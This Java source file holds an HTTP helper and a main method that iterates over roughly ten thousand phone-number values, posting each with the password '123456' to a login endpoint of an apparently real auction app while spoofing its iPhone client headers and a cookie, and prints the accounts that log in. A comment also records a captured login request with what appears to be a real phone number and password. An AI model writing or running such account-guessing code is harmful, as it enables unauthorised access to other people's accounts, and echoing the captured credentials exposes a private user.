package com.kdb.util;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import okhttp3.*;

import java.io.IOException;

public class HttpRequest {


    public static String post(String url , RequestBody body){
        OkHttpClient client = new OkHttpClient();

        Request request = new Request.Builder()
                .header("Host","k.jingfenshenqi.com")
                .header("Accept","*/*")
                .header("Cookie","acw_tc=AQAAAP2NrUbd6g4AAnrycldkceJgkwr5")
                .header("User-Agent","YiYuanDuoBaoQuick/1.4 (iPhone; iOS 10.3.3; Scale/3.00)")
                .header("Accept-Language","zh-Hans-CN;q=1")
                .post(body)
                .url(url).
                        build();
        try{
            Response response = client.newCall(request).execute();
            if(response.isSuccessful()){
                String result = response.body().string();
                return result;
            }
        }catch(IOException e){
            e.printStackTrace();
        }

        return "";
    }


    public static void main(String[] args) {
        //curl -H 'Host: k.jingfenshenqi.com' -H 'Accept: */*' -H 'Cookie: acw_tc=AQAAAI6lbBCJNA8AAnrycjsFgPbtGluu' -H 'User-Agent: YiYuanDuoBaoQuick/1.4 (iPhone; iOS 10.3.3; Scale/3.00)' -H 'Accept-Language: zh-Hans-CN;q=1' --data "mobile=17611646682&password=535820" --compressed 'http://k.jingfenshenqi.com/kauction/client/login'
        OkHttpClient client = new OkHttpClient();

        for(long i = 36180000; i < 36189999; i++){
            String mobile = i + "";
            RequestBody body = new FormBody.Builder()
                    .add("mobile", mobile)
                    .add("password","123456")
                    .build();
            Request request = new Request.Builder()
                    .header("Host","k.jingfenshenqi.com")
                    .header("Accept","*/*")
                    .header("Cookie","acw_tc=AQAAAP2NrUbd6g4AAnrycldkceJgkwr5")
                    .header("User-Agent","YiYuanDuoBaoQuick/1.4 (iPhone; iOS 10.3.3; Scale/3.00)")
                    .header("Accept-Language","zh-Hans-CN;q=1")
                    .post(body)
                    .url("http://k.jingfenshenqi.com/kauction/client/login").
                            build();
            try{
                Response response = client.newCall(request).execute();
                if(response.isSuccessful()){
                    String result = response.body().string();
                    JSONObject json = JSON.parseObject(result);
                    //System.out.println(json);
                    if("1".equals(json.getString("status"))){
                        System.out.println(mobile);
                    }else{
                        if("500".equals(json.getString("errorCode"))){
                            System.out.println(mobile + ":" + json.getString("msg"));
                        }
                    }
                }
            }catch(IOException e){
                e.printStackTrace();
            }

        }


    }

}
